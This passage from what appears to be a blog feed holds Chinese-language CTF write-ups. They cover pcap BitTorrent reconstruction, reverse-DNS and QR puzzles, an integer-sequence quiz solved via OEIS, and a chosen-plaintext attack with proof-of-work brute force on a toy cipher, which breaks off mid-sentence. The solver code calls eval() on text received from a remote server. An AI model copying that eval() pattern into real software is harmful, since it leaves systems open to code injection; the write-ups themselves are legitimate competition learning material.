      <content type="html"><![CDATA[<p>#peers<br>100 Pts<br><a href="http://dl.0ops.net/peers.pcapng" target="_blank" rel="noopener">peers</a> :P</p><a id="more"></a><p>用<code>foremost</code>提取出一张<code>bmp</code>图片，信息无法查看，对比文件格式，没有问题。。。<br>后来想到，bittorrent协议传输的时候是无序的，所以<code>bmp</code>文件的顺序不对，手动提取。<br>由于端口是<code>80</code>，明显不对，修改成<code>6881</code>，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcprewrite --infile=peers.pcap --outfile=fixed.pcap --portmap 80:6881</span><br></pre></td></tr></table></figure></p><p>现在就要提取数据了，这里要用到<a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" rel="noopener">tshark</a>，具体命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r fixed.pcap -R &apos;bittorrent.piece.data&apos; -Tfields -e bittorrent.piece.index -e bittorrent.piece.data &gt; pieces</span><br></pre></td></tr></table></figure></p><p>过滤出的数据包含索引和数据两部分，根据索引恢复文件，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pieces = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">'pieces'</span>):</span><br><span class="line">    line = line.strip()</span><br><span class="line"></span><br><span class="line">    idx, data = line.split(<span class="string">'\t'</span>)</span><br><span class="line">    data = data.replace(<span class="string">':'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pieces[idx] += data</span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        pieces[idx] = data</span><br><span class="line"></span><br><span class="line">pieces = sorted([(int(p[<span class="number">0</span>], <span class="number">16</span>), p[<span class="number">1</span>]) <span class="keyword">for</span> p <span class="keyword">in</span> pieces.items()])</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span>.join([p[<span class="number">1</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pieces])</span><br><span class="line">open(<span class="string">'peers.bmp'</span>, <span class="string">'wb'</span>).write(data)</span><br></pre></td></tr></table></figure></p><p>还原出的图片：<br><img src="http://junzhepanblog.qiniudn.com/peers.bmp" alt="peers"><br>最终flag：<code>0ctf{Rec0ver_Me_Piece_by_Piece}</code>。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0CTF 2015 Quals treasure Write-up</title>
      <link href="/2015/03/30/0CTF-2015-Quals-treasure-Write-up/"/>
      <url>/2015/03/30/0CTF-2015-Quals-treasure-Write-up/</url>
      <content type="html"><![CDATA[<p>#treasure<br>50 Pts<br>Romors say that something is buried in treasure.ctf.0ops.sjtu.cn, happy treasure hunting. :)</p><a id="more"></a><p>先通过<code>DNS</code>查询得到一个<code>IPv6</code>地址，然后用<code>DSN Reverse Lookup</code>工具得到以下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dig -x 2001:0470:000d:0b28:0000:0000:0040:0001                       </span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.30.rc1.el6_6.2 &lt;&lt;&gt;&gt; -x 2001:0470:000d:0b28:0000:0000:0040:0001</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24745</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;1.0.0.0.0.4.0.0.0.0.0.0.0.0.0.0.8.2.b.0.d.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa. IN PTR</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">1.0.0.0.0.4.0.0.0.0.0.0.0.0.0.0.8.2.b.0.d.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa. 227 IN PTR YouHaveReachedTheTreasure.DoYouGetTheFLAG?.</span><br><span class="line"></span><br><span class="line">;; Query time: 1 msec</span><br><span class="line">;; SERVER: 74.207.241.5#53(74.207.241.5)</span><br><span class="line">;; WHEN: Sun Mar 29 07:52:13 2015</span><br><span class="line">;; MSG SIZE  rcvd: 146</span><br></pre></td></tr></table></figure></p><p>然后根据提示，需要找中间部分，这里使用<code>mtr</code>，用<code>--raw</code>参数，将结果打印出来，结果中有一堆01字符串，提取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0000000110001101110000000</span><br><span class="line">0111110111100111110111110</span><br><span class="line">0100010110001100110100010</span><br><span class="line">0100010101000011010100010</span><br><span class="line">0100010101010101110100010</span><br><span class="line">0111110110011011010111110</span><br><span class="line">0000000101010101010000000</span><br><span class="line">1111111110111100111111111</span><br><span class="line">0011100010001010011100111</span><br><span class="line">0100011011001101101000000</span><br><span class="line">0101010000111110110010100</span><br><span class="line">0011111011010110011010101</span><br><span class="line">1001010100000111010010000</span><br><span class="line">0001111100000101001010110</span><br><span class="line">0110110100110010110100000</span><br><span class="line">0100101001101111101000010</span><br><span class="line">0110100101100000000001010</span><br><span class="line">1111111100111011011101001</span><br><span class="line">0000000101101110010101100</span><br><span class="line">0111110101111100011100110</span><br><span class="line">0100010110011010000001101</span><br><span class="line">0100010111011101000011000</span><br><span class="line">0100010110010110111010010</span><br><span class="line">0111110100101111000010110</span><br><span class="line">0000000100000010010100110</span><br></pre></td></tr></table></figure></p><p>然后将其转换成图片，得到二维码，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qcode_chars = <span class="string">'0000000110001101110000000'</span> \</span><br><span class="line">                <span class="string">'0111110111100111110111110'</span> \</span><br><span class="line">                <span class="string">'0100010110001100110100010'</span> \</span><br><span class="line">                <span class="string">'0100010101000011010100010'</span> \</span><br><span class="line">                <span class="string">'0100010101010101110100010'</span> \</span><br><span class="line">                <span class="string">'0111110110011011010111110'</span> \</span><br><span class="line">                <span class="string">'0000000101010101010000000'</span> \</span><br><span class="line">                <span class="string">'1111111110111100111111111'</span> \</span><br><span class="line">                <span class="string">'0011100010001010011100111'</span> \</span><br><span class="line">                <span class="string">'0100011011001101101000000'</span> \</span><br><span class="line">                <span class="string">'0101010000111110110010100'</span> \</span><br><span class="line">                <span class="string">'0011111011010110011010101'</span> \</span><br><span class="line">                <span class="string">'1001010100000111010010000'</span> \</span><br><span class="line">                <span class="string">'0001111100000101001010110'</span> \</span><br><span class="line">                <span class="string">'0110110100110010110100000'</span> \</span><br><span class="line">                <span class="string">'0100101001101111101000010'</span> \</span><br><span class="line">                <span class="string">'0110100101100000000001010'</span> \</span><br><span class="line">                <span class="string">'1111111100111011011101001'</span> \</span><br><span class="line">                <span class="string">'0000000101101110010101100'</span> \</span><br><span class="line">                <span class="string">'0111110101111100011100110'</span> \</span><br><span class="line">                <span class="string">'0100010110011010000001101'</span> \</span><br><span class="line">                <span class="string">'0100010111011101000011000'</span> \</span><br><span class="line">                <span class="string">'0100010110010110111010010'</span> \</span><br><span class="line">                <span class="string">'0111110100101111000010110'</span> \</span><br><span class="line">                <span class="string">'0000000100000010010100110'</span></span><br><span class="line">img = Image.new(<span class="string">'L'</span>, (<span class="number">25</span>,<span class="number">25</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">25</span>):</span><br><span class="line">        <span class="keyword">if</span> qcode_chars[j * <span class="number">25</span> + i] == <span class="string">'0'</span>:</span><br><span class="line">            img.putpixel((i, j), <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i, j), <span class="number">255</span>)</span><br><span class="line">img = img.resize((<span class="number">250</span>,<span class="number">250</span>))</span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">'qrcode.bmp'</span>)</span><br></pre></td></tr></table></figure></p><p>扫描得到flag：<code>0CTF{Reverse DNS is so FUN!}</code>。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BCTF 2015 experiment Write-up</title>
      <link href="/2015/03/27/BCTF-2015-experiment-Write-up/"/>
      <url>/2015/03/27/BCTF-2015-experiment-Write-up/</url>
      <content type="html"><![CDATA[<p>#experiment<br>Score: 300</p><p>Hi, we have a short survey with 50 questions. You can get a flag as award once you finished it.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc 104.197.7.111 13135</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>题目描述说会有50个问题。先连服务器，返回如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Overcomplicated Experiment of Integer Syndrome</span><br><span class="line">We are doing some research on &quot;integer syndrome&quot;,</span><br><span class="line">anyone who finished our survey will be awarded a flag!</span><br><span class="line">---------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Okay, let&apos;s begin with simple questions.</span><br><span class="line">Is 224.00*589.00+306.00/328.00-433.00+252.00 an integer or not? Answer (yes/no):</span><br></pre></td></tr></table></figure></p><p>第一类问题就是判断表达式的结果是否为整数，这个好解决，把表达式解析出来，在<code>Python</code>下直接用<code>eval()</code>计算出结果，然后判断是否为整数，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer_integer</span><span class="params">(question)</span>:</span></span><br><span class="line">    start_index = question.find(<span class="string">'Is'</span>) + <span class="number">3</span></span><br><span class="line">    end_index = question.find(<span class="string">'an'</span>)</span><br><span class="line">    q = question[start_index:end_index]</span><br><span class="line">    r = eval(q)</span><br><span class="line">    <span class="keyword">if</span> r % <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'yes'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'no'</span></span><br></pre></td></tr></table></figure></p><p>这样的题目会有10个，过了之后，新题目如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Great! Time for calculating weird integer sequences.</span><br><span class="line"></span><br><span class="line">Description: The prime numbers.</span><br><span class="line">The sequence starts with: 2,3,5,7,11,13,17,19,23,29</span><br><span class="line">(first term is for n = 1)</span><br><span class="line">n = 4121, Answer:</span><br></pre></td></tr></table></figure></p><p>这个是让你找素数，简单方法是网上找已有素数表，直接查表就行了。先在这个是让你找素数，简单方法是网上找已有素数表，直接查表就行了。在网上搜的时候找到一个网站<a href="http://oeisf.org/" target="_blank" rel="noopener">OEIS</a>，上面有关于素数的描述页面<a href="http://oeis.org/A000040" target="_blank" rel="noopener">A000040</a>，同时给了一个有<code>10000</code>个素数的<a href="http://oeis.org/A000040/b000040.txt" target="_blank" rel="noopener">列表</a>，足够用了。<br>OK，现在下一题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line"> Fibonacci numbers: F(n) = F(n-1) + F(n-2) with F(0) = 0 and F(1) = 1.</span><br><span class="line">The sequence starts with: 0,1,1,2,3,5,8,13,21,34</span><br><span class="line">(first term is for n = 0)</span><br><span class="line">n = 101, Answer:</span><br></pre></td></tr></table></figure></p><p>这个是<code>Fibonacci</code>序列，继续在网上找生成好的表，发现<code>OEIS</code>也有<a href="http://oeis.org/A000045" target="_blank" rel="noopener">A000045</a>，给出了<a href="http://oeis.org/A000045/b000045.txt" target="_blank" rel="noopener">2000个</a>。</p><blockquote><p>现在已经隐隐觉得<code>OEIS</code>是题库。</p></blockquote><p>现在继续，新题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line"> Number of trees with n unlabeled nodes.</span><br><span class="line">The sequence starts with: 1,1,1,1,2,3,6,11,23,47</span><br><span class="line">(first term is for n = 0)</span><br><span class="line">n = 598, Answer:</span><br></pre></td></tr></table></figure></p><p>先在<code>OEIS</code>上找找吧，果真有<a href="http://oeis.org/A000055" target="_blank" rel="noopener">A000055</a>，跟上面类似，这里就不上代码了。继续新题目······<br>后面的题目，跟前面的不一样，前面几道数列固定，只是每次<code>n</code>不一样，而这时候连数列也变了，我多跑了几次，基本每次都不一样，看来<code>OEIS</code>真是题库，所以思路就有了：拿到题目去<code>OEIS</code>上搜，找到已有的列表，然后查表找到答案。</p><blockquote><p>代码就不列出来了，请看<a href="http://junzhepanblog.qiniudn.com/experiment.zip" target="_blank" rel="noopener">完整源码</a></p></blockquote><p>就这样回答了32个这种题目后，素数序列跑出来复仇了，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Description: The Prime Numbers Revenge</span><br><span class="line">The sequence starts with: 2,3,5,7,11,13,17</span><br><span class="line">(first term is for n = 1)</span><br><span class="line">n = 23338374, Answer:</span><br></pre></td></tr></table></figure></p><p>这里<code>n = 23338374</code>，尝试几次后，发现<code>n</code>范围在<code>23 million</code>和<code>24 million</code>之间，这就好办了，找到一个网页<a href="https://primes.utm.edu/lists/small/millions/" target="_blank" rel="noopener">The first fifty million primes</a>，下载<code>twenty-fourth million</code>，然后继续查表。<br>这个过了之后，又来了个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line"> Catalan numbers: C(n) = binomial(2n,n)/(n+1) = (2n)!/(n!(n+1)!). Also called Segner numbers.</span><br><span class="line">The sequence starts with: 1,1,2,5,14,42,132</span><br><span class="line">(first term is for n = 0)</span><br><span class="line">n = 3909, Answer:</span><br></pre></td></tr></table></figure></p><p><code>OEIS</code>上现有的依旧不够，但是这里给出了计算公式，在<code>Python</code>下直接计算即可，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fac</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(operator.mul, range(<span class="number">1</span>, n+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_catalan_number</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(fac(<span class="number">2</span> * n) / (fac(n) * fac(n + <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer_catalan_number</span><span class="params">(question)</span>:</span></span><br><span class="line">    start_index = question.find(<span class="string">'n = 0)'</span>) + <span class="number">6</span></span><br><span class="line">    start_index = question.find(<span class="string">'n = '</span>, start_index) + <span class="number">4</span></span><br><span class="line">    end_index = question.find(<span class="string">","</span>, start_index)</span><br><span class="line">    n = question[start_index:end_index]</span><br><span class="line">    <span class="keyword">return</span> calc_catalan_number(int(n))</span><br></pre></td></tr></table></figure></p><p>然后，有杀出这个题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line"> Number of sets of rooted connected graphs where every block is a complete graph.</span><br><span class="line">The sequence starts with: 1,1,2,5,14,42</span><br><span class="line">(first term is for n = 0)</span><br><span class="line">n = 927, Answer:</span><br></pre></td></tr></table></figure></p><p>没有公式，不知道如何来做，然后及没有然后了。。。</p><p>后来看了别人的<a href="http://xrekkusu.hatenablog.jp/entry/2015/03/24/230921" target="_blank" rel="noopener">write-up</a>，后面三题在<code>OEIS</code>上给出了<code>Maple</code>和<code>Mathematica</code>公式，以下是用<code>Mathematica</code>公式。<br>48题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etr[p_] := Module[&#123;b&#125;, b[n_] := b[n] = If[n == 0, 1, Sum[Sum[d*p[d], &#123;d, Divisors[ j]&#125;]*b[n-j], &#123;j, 1, n&#125;]/n]; b]; b = etr[aa]; c = etr[b]; aa = Function[&#123;n&#125;, If[n == 0, 0, c[n-1]]]; a = etr[aa]; Table[a[n], &#123;n, 0, 700&#125;]</span><br></pre></td></tr></table></figure></p><p>49题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a[n_] := Module[&#123;B&#125;, B[x_, y_, d_, a_, b_] := If[a+b &lt;= d, Expand[x+B[x^2+2*x*y, x, d, a+b, a]], x]; Coefficient[B[z, 0, n, 1, 1], z, n]];</span><br><span class="line">a[1298]</span><br><span class="line">Expand function is a very important technique. Without it, this calculation took very very long time and the question would be time out.</span><br></pre></td></tr></table></figure></p><p>50题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? &#123;a(n) = if( n&lt;0, 0, polcoeff( 1 / eta(x + x * O(x^n)), n))&#125;;</span><br><span class="line">? a(23370) % 1000000007</span><br></pre></td></tr></table></figure></p><p>flag：<code>BCTF{Y0u_h4ve_m0ar_7ermz_than_205}</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BCTF 2015 weak_enc Write-up</title>
      <link href="/2015/03/24/BCTF-2015-weak-enc-Write-up/"/>
      <url>/2015/03/24/BCTF-2015-weak-enc-Write-up/</url>
      <content type="html"><![CDATA[<p>#weak_enc<br>Score: 200</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc 146.148.79.13 8888</span><br></pre></td></tr></table></figure><p><a href="http://dl.bctf.cn/weak_enc-40eb1171f07d8ebb06bbf36849d829a1.py.xz" target="_blank" rel="noopener">http://dl.bctf.cn/weak_enc-40eb1171f07d8ebb06bbf36849d829a1.py.xz</a></p><p>Decrypt: NxQ1NDMYcDcw53gVHzI7</p><p>The flag for this problem does not look like BCTF{xxxxxx}</p><a id="more"></a><p>下载源码分析，连上服务器要先过一个验证，具体代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">proof = b64.b64encode(os.urandom(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">req.sendall(<span class="string">"Please provide your proof of work, a sha1 sum ending in 16 bit's set to 0, it must be of length %s bytes, starting with %s\n"</span> % (len(proof)+<span class="number">5</span>, proof))</span><br><span class="line"></span><br><span class="line">test = req.recv(<span class="number">21</span>)</span><br><span class="line">ha = hashlib.sha1()</span><br><span class="line">ha.update(test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test[<span class="number">0</span>:<span class="number">16</span>] != proof <span class="keyword">or</span> ord(ha.digest()[<span class="number">-1</span>]) != <span class="number">0</span> <span class="keyword">or</span> ord(ha.digest()[<span class="number">-2</span>]) != <span class="number">0</span>):</span><br><span class="line">    req.sendall(<span class="string">"Check failed"</span>)</span><br><span class="line">    req.close()</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure></p><p>服务器提供一个16字节的<code>proof</code>，在后面加5个字节的内容，产生一个以0结尾的<code>sha1</code>，由于情况不多，这里使用暴力枚举：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_test</span><span class="params">(proof)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> test <span class="keyword">in</span> itertools.permutations(chars, <span class="number">5</span>):</span><br><span class="line">        test = proof + <span class="string">''</span>.join(test)</span><br><span class="line">        ha = hashlib.sha1()</span><br><span class="line">        ha.update(test)</span><br><span class="line">        digest = ha.digest()</span><br><span class="line">        <span class="keyword">if</span> ord(digest[<span class="number">-1</span>]) == <span class="number">0</span> <span class="keyword">and</span> ord(digest[<span class="number">-2</span>]) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> test</span><br></pre></td></tr></table></figure></p><p>然后就是加密函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Encryption function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(SALT, m)</span>:</span></span><br><span class="line">    lzwDict = dict()</span><br><span class="line">    toEnc = LZW(SALT + m, lzwDict)</span><br><span class="line">    key = hashlib.md5(SALT*<span class="number">2</span>).digest()</span><br><span class="line">    OTPBase = <span class="string">""</span></span><br><span class="line">    OPT = <span class="string">""</span></span><br><span class="line">    step = HASHLENGTH - SMALLPRIME</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>*N+step, step):</span><br><span class="line">        rand, key = STRONGPseudoRandomGenerator(key)</span><br><span class="line">        OTPBase += rand</span><br><span class="line">    enc = []</span><br><span class="line">    otpadded = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(toEnc)):</span><br><span class="line">        index = i % N</span><br><span class="line">        iRound = i / N + <span class="number">1</span></span><br><span class="line">        OTP = OTPBase[<span class="number">3</span>*int(pow(ord(OTPBase[<span class="number">3</span>*index]),ord(OTPBase[<span class="number">3</span>*index+<span class="number">1</span>])*iRound, N))+<span class="number">2</span>]</span><br><span class="line">        otpadded.append(ord(OTP))</span><br><span class="line">        enc.append(chr(toEnc[i] ^ ord(OTP)))</span><br><span class="line">    <span class="keyword">return</span> b64.b64encode(<span class="string">''</span>.join(enc))</span><br></pre></td></tr></table></figure></p><p>其中主要用到<code>LZW()</code>函数，而且使用的<code>SALT</code>也是未知的。但是<code>SALT</code>是固定的，可以使用选择明文攻击，根据密文，想办法把<code>SALT</code>还原出来，然后再写一个解密函数即可。<br><code>LZW</code>是一种数据压缩算法，具体介绍见<a href="http://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch" target="_blank" rel="noopener">Lempel–Ziv–Welch</a>。根据它的原理，先尝试加密26个小写字母的结果，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">b -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">c -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">d -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">e -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">f -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">g -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">h -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">i -&gt; NxQ1NDMYcDcw53gf</span><br><span class="line">j -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">k -&gt; NxQ1NDMYcDcw53gc</span><br><span class="line">l -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">m -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">n -&gt; NxQ1NDMYcDcw53ge</span><br><span class="line">o -&gt; NxQ1NDMYcDcw53gd</span><br><span class="line">p -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">q -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">r -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">s -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">t -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">u -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">v -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">w -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">x -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">y -&gt; NxQ1NDIZcTY/5Hka</span><br><span class="line">z -&gt; NxQ1NDIZcTY/5Hka</span><br></pre></td></tr></table></figure></p><p>可以看到，只有<code>i, k, n, 